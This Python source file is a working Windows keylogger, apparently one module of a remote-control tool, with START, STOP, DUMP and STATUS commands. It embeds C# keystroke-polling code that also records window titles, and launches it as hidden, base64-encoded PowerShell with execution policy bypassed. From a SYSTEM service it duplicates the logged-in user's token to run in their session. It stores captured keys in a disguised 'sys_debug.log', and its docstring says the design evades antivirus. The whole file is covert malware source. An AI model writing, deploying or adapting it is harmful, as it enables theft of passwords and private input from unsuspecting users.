"""
Keylogger Tool - Compatible Session 0 (Windows Service)

This version uses a C# Polling method (GetAsyncKeyState) injected via PowerShell.
It is more robust than System Hooks (SetWindowsHookEx) to avoid AV blocks
and message loop issues in windowless processes.
"""

import os
import sys
import ctypes
import tempfile
import subprocess
import logging
import base64
import time
from ctypes import wintypes
from datetime import datetime

logger = logging.getLogger(__name__)

WTS_CURRENT_SERVER_HANDLE = 0
WTSActive = 0
MAXIMUM_ALLOWED = 0x02000000
TOKEN_DUPLICATE = 0x0002
TOKEN_QUERY = 0x0008
SecurityImpersonation = 2
TokenPrimary = 1
CREATE_NO_WINDOW = 0x08000000
NORMAL_PRIORITY_CLASS = 0x00000020

try:
    if sys.platform == 'win32':
        wtsapi32 = ctypes.windll.wtsapi32
        kernel32 = ctypes.windll.kernel32
        advapi32 = ctypes.windll.advapi32
        user32 = ctypes.windll.user32
        HAS_WTS = True
    else:
        HAS_WTS = False
except Exception:
    HAS_WTS = False

class WTS_SESSION_INFO(ctypes.Structure):
    _fields_ = [("SessionId", wintypes.DWORD),
                ("pWinStationName", wintypes.LPWSTR),
                ("State", wintypes.DWORD)]

class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ('cb', wintypes.DWORD), ('lpReserved', wintypes.LPWSTR),
        ('lpDesktop', wintypes.LPWSTR), ('lpTitle', wintypes.LPWSTR),
        ('dwX', wintypes.DWORD), ('dwY', wintypes.DWORD),
        ('dwXSize', wintypes.DWORD), ('dwYSize', wintypes.DWORD),
        ('dwXCountChars', wintypes.DWORD), ('dwYCountChars', wintypes.DWORD),
        ('dwFillAttribute', wintypes.DWORD), ('dwFlags', wintypes.DWORD),
        ('wShowWindow', wintypes.WORD), ('cbReserved2', wintypes.WORD),
        ('lpReserved2', ctypes.c_void_p), ('hStdInput', wintypes.HANDLE),
        ('hStdOutput', wintypes.HANDLE), ('hStdError', wintypes.HANDLE)
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('hProcess', wintypes.HANDLE), ('hThread', wintypes.HANDLE),
        ('dwProcessId', wintypes.DWORD), ('dwThreadId', wintypes.DWORD)
    ]


def get_powershell_script(log_path):
    """
    Generates the C# script that polls GetAsyncKeyState.
    More robust than Hooks for hidden processes.
    """
    escaped_log_path = log_path.replace("\\", "\\\\")
    
    ps_script = f"""
$LogFile = "{escaped_log_path}"

$code = @"
using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

public class KeyPoller {{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    private static string logPath;
    private static string lastWindow = "";

    public static void Start(string path) {{
        logPath = path;
        
        Log("[STARTED - " + DateTime.Now.ToString() + "]\\n");

        while (true) {{
            Thread.Sleep(20);

            try {{
                IntPtr hWnd = GetForegroundWindow();
                StringBuilder sb = new StringBuilder(256);
                if (GetWindowText(hWnd, sb, 256) > 0) {{
                    string currentWindow = sb.ToString();
                    if (currentWindow != lastWindow) {{
                        lastWindow = currentWindow;
                        Log("\\n[WIN: " + currentWindow + "]\\n");
                    }}
                }}
            }} catch {{}}

            for (int i = 8; i < 255; i++) {{
                short state = GetAsyncKeyState(i);
                if ((state & 1) == 1) {{
                    string key = ((Keys)i).ToString();
                    
                    bool shift = (GetAsyncKeyState(0x10) & 0x8000) != 0;
                    
                    if (i >= 65 && i <= 90) {{
                        if (!shift) key = key.ToLower();
                    }}
                    else if (i >= 48 && i <= 57) {{
                        key = i >= 48 && i <= 57 ? ((char)i).ToString() : key;
                    }}
                    else {{
                        if (i == 13) key = "\\n";
                        else if (i == 32) key = " ";
                        else if (i == 8) key = "[BS]";
                        else if (key.Length > 1) key = "[" + key + "]";
                    }}

                    Log(key);
                }}
            }}
        }}
    }}

    private static void Log(string text) {{
        try {{ File.AppendAllText(logPath, text); }} catch {{}}
    }}
}}
"@

Add-Type -TypeDefinition $code -ReferencedAssemblies System.Windows.Forms
[KeyPoller]::Start($LogFile)
"""
    return ps_script


class KeyloggerManager:
    def __init__(self):
        self.running = False
        self.process = None
        self.pid = None
        
        public_dir = os.environ.get('PUBLIC', os.environ.get('SystemDrive', 'C:') + '\\Users\\Public')
        self.log_file = os.path.join(public_dir, "sys_debug.log")
        
    def _get_active_session(self):
        if not HAS_WTS: return None
        try:
            count = wintypes.DWORD()
            sessions = ctypes.POINTER(WTS_SESSION_INFO)()
            if wtsapi32.WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, ctypes.byref(sessions), ctypes.byref(count)):
                try:
                    for i in range(count.value):
                        if sessions[i].State == WTSActive and sessions[i].SessionId != 0:
                            return sessions[i].SessionId
                finally:
                    wtsapi32.WTSFreeMemory(sessions)
        except:
            pass
        return kernel32.WTSGetActiveConsoleSessionId()

    def _start_as_user(self, cmd_line):
        session_id = self._get_active_session()
        if not session_id or session_id == 0xFFFFFFFF:
            return False, "No active user session found"

        user_token = wintypes.HANDLE()
        primary_token = wintypes.HANDLE()

        try:
            if not wtsapi32.WTSQueryUserToken(session_id, ctypes.byref(user_token)):
                return False, "WTSQueryUserToken failed"
            
            if not advapi32.DuplicateTokenEx(user_token, MAXIMUM_ALLOWED, None, 
                                             SecurityImpersonation, TokenPrimary, ctypes.byref(primary_token)):
                return False, "DuplicateTokenEx failed"

            si = STARTUPINFO()
            si.cb = ctypes.sizeof(STARTUPINFO)
            si.lpDesktop = "winsta0\\default"
            pi = PROCESS_INFORMATION()
            
            cmd = ctypes.create_unicode_buffer(cmd_line)
            
            if not advapi32.CreateProcessAsUserW(
                primary_token, None, cmd, None, None, False,
                CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS,
                None, None, ctypes.byref(si), ctypes.byref(pi)
            ):
                return False, f"CreateProcessAsUser failed: {ctypes.get_last_error()}"

            self.process = pi
            self.pid = pi.dwProcessId
            return True, f"Started in Session {session_id} (PID: {self.pid})"
            
        except Exception as e:
            return False, str(e)
        finally:
            if user_token: kernel32.CloseHandle(user_token)
            if primary_token: kernel32.CloseHandle(primary_token)

    def start(self):
        if self.running:
            return "Already running"

        try:
            if os.path.exists(self.log_file): os.remove(self.log_file)
        except: pass

        ps_code = get_powershell_script(self.log_file)
        encoded_cmd = base64.b64encode(ps_code.encode('utf-16le')).decode('ascii')
        
        cmd = f'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {encoded_cmd}'

        is_service = False
        try:
            if sys.platform == 'win32':
                sess_id = wintypes.DWORD()
                kernel32.ProcessIdToSessionId(os.getpid(), ctypes.byref(sess_id))
                if sess_id.value == 0:
                    is_service = True
        except: pass

        success = False
        msg = ""

        if is_service:
            success, msg = self._start_as_user(cmd)
        else:
            try:
                proc = subprocess.Popen(cmd, shell=True, 
                                      creationflags=CREATE_NO_WINDOW if sys.platform == 'win32' else 0)
                self.pid = proc.pid
                success = True
                msg = f"Started locally (PID: {self.pid})"
            except Exception as e:
                msg = str(e)

        if success:
            self.running = True
            time.sleep(0.5)
            return f"Keylogger STARTED. {msg}"
        else:
            return f"Failed to start: {msg}"

    def stop(self):
        if not self.running:
            return "Not running"

        try:
            if self.pid:
                subprocess.run(f"taskkill /F /PID {self.pid}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if self.process:
                kernel32.CloseHandle(self.process.hProcess)
                kernel32.CloseHandle(self.process.hThread)
                self.process = None
            
            self.running = False
            self.pid = None
            return "Keylogger STOPPED"
        except Exception as e:
            return f"Error stopping: {e}"

    def dump(self):
        if not os.path.exists(self.log_file):
            if self.running:
                return "Keylogger is running but log file is empty/missing. (Initialization...)"
            return "No logs found."
        
        try:
            with open(self.log_file, "r", errors="ignore") as f:
                content = f.read()
            
            if not content:
                return "(Empty log)"

            return content.replace('\r\n', '\\n').replace('\n', '\\n').replace('\r', '\\r')
            
        except Exception as e:
            return f"Error reading logs: {e}"

_kl_instance = KeyloggerManager()

def keylogger_action(action: str) -> str:
    cmd = action.upper().strip()
    if cmd == "START":
        return _kl_instance.start()
    elif cmd == "STOP":
        return _kl_instance.stop()
    elif cmd == "DUMP":
        return _kl_instance.dump()
    elif cmd == "STATUS":
        return "RUNNING" if _kl_instance.running else "STOPPED"
    return "Unknown command"

if __name__ == "__main__":
    print(keylogger_action("START"))
    time.sleep(5) 
    print(keylogger_action("DUMP"))
    print(keylogger_action("STOP"))
